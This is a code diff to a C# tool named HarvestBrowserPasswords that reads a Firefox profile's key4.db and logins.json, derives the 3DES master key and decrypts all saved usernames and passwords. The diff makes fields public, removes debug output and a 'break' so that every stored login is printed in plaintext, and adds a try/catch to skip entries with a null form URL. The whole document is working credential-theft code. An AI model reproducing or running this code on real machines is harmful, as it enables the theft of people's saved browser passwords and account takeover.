@@ -12,11 +12,11 @@ namespace HarvestBrowserPasswords
 {
     public class FirefoxDatabaseDecryptor
     {
-        private string ProfileDir               { get; set; }
-        private string Key4dbpath               { get; set; }
-        private byte[] GlobalSalt               { get; set; }
+        public string ProfileDir               { get; set; }
+        public string Key4dbpath               { get; set; }
+        public byte[] GlobalSalt               { get; set; }
         public byte[] EntrySaltPasswordCheck    { get; set; }
-        private byte[] EntrySalt3DESKey         { get; set; }
+        public byte[] EntrySalt3DESKey         { get; set; }
         public byte[] CipherTextPasswordCheck   { get; set; }
         public byte[] CipherText3DESKey         { get; set; }
         public string MasterPassword            { get; set; }
@@ -49,39 +49,43 @@ namespace HarvestBrowserPasswords
                     //Master key should have 8 bytes of PKCS#7 Padding
                     Decrypted3DESKey = Decrypt3DESMasterKey(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
 
-                    //Check for and remove padding
+                    //Check for PKCS#7 padding and remove if it exists
                     Decrypted3DESKey = Unpad(Decrypted3DESKey);
 
                     Console.ForegroundColor = ConsoleColor.Yellow;
                     foreach (FirefoxLoginsJSON.Login login in JSONLogins.Logins)
                     {
-                        byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
-                        byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);
-                        Console.WriteLine($"URL                     {login.FormSubmitURL}");
-                        Console.WriteLine($"Encrypted Username      {BitConverter.ToString(usernameBytes)}");
-                        Console.WriteLine($"Encrypted Password      {BitConverter.ToString(passwordBytes)}");
+                        
+                        try
+                        {
+                            if (!(login.FormSubmitURL.Equals(null)))
+                            {
+                                byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
+                                byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);
+                                Console.WriteLine($"URL                     {login.FormSubmitURL}");
 
+                                ASN1 usernameASN1 = new ASN1(usernameBytes);
 
-                        //TODO: Reimplement ASN.1 Parser more generically - need to be able to extract entry salt and ciphertext from ASN.1 encoded login data - 
-                        //ASN1Parser usernameParser = new ASN1Parser(usernameBytes);
-                        ASN1 usernameASN1 = new ASN1(usernameBytes);
+                                byte[] usernameIV = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
+                                byte[] usernameEncrypted = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
 
-                        byte[] usernameIV = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
-                        byte[] usernameEncrypted = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
+                                //Extract password ciphertext from logins.json
+                                ASN1 passwordASN1 = new ASN1(passwordBytes);
 
-                        //Extract password ciphertext from logins.json
-                        ASN1 passwordASN1 = new ASN1(passwordBytes);
+                                byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
+                                byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
 
-                        byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
-                        byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
+                                string usernameDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
+                                string passwordDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
 
-                        string usernameDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
-                        string passwordDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
+                                Console.WriteLine($"Decrypted Username      {usernameDecrypted}");
+                                Console.WriteLine($"Decrypted Password      {passwordDecrypted}");
+                            }
+                        }
+                        catch (NullReferenceException)
+                        {
 
-                        Console.WriteLine($"Decrypted Username      {usernameDecrypted}");
-                        Console.WriteLine($"Decrypted Password      {passwordDecrypted}");
-                        //Remove this
-                        break;
+                        }
                     }
                 }
             }
@@ -166,12 +170,6 @@ namespace HarvestBrowserPasswords
             byte[] edeKey;
             byte[] decryptedResult;
 
-            //DEBUG
-            Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.WriteLine("DEBUG - Master Password Decryption");
-            Console.WriteLine($"CipherText:             {BitConverter.ToString(cipherText)}");
-            Console.WriteLine($"Master Password:        {masterPassword}"); 
-
             //Hashed Password = SHA1(salt + password)
             byte[] hashedPasswordBuffer = new byte[globalSalt.Length + password.Length];
             //Copy salt into first chunk of new buffer
@@ -179,9 +177,6 @@ namespace HarvestBrowserPasswords
             //Copy password into second chunk of buffer
             Buffer.BlockCopy(password, 0, hashedPasswordBuffer, globalSalt.Length, password.Length);
             hashedPassword = hashedPasswordBuffer;
-
-            //DEBUG
-            Console.WriteLine($"Global Salt:            {BitConverter.ToString(globalSalt)}");
   
             using (SHA1 sha1 = new SHA1CryptoServiceProvider())
             {
@@ -197,10 +192,6 @@ namespace HarvestBrowserPasswords
             {   
                 combinedHashedPassword = sha1.ComputeHash(combinedHashedPassword);
             }
-
-            //DEBUG
-            Console.WriteLine($"hashedPassword:         {BitConverter.ToString(hashedPassword)}");
-            Console.WriteLine($"combinedHashedPassword: {BitConverter.ToString(combinedHashedPassword)}");
 
             //Create paddedEntrySalt
             byte[] paddedEntrySalt = new byte[20];
@@ -235,18 +226,14 @@ namespace HarvestBrowserPasswords
                     edeKey = tempKey;
                 }
 
-                //DEBUG
-                Console.WriteLine($"EDE KEY:                {BitConverter.ToString(edeKey)}");
-
                 byte[] key = new byte[24];
                 byte[] iv = new byte[8];
 
                 //Extract 3DES encryption key from first 24 bytes of EDE key
                 Buffer.BlockCopy(edeKey, 0, key, 0, 24);
-                Console.WriteLine($"DES Encryption key:     {BitConverter.ToString(key)}");
+
                 //Extract initialization vector from last 8 bytes of EDE key
                 Buffer.BlockCopy(edeKey, (edeKey.Length - 8), iv, 0, 8);
-                Console.WriteLine($"IV:                     {BitConverter.ToString(iv)}");
 
                 using (TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider
                 {
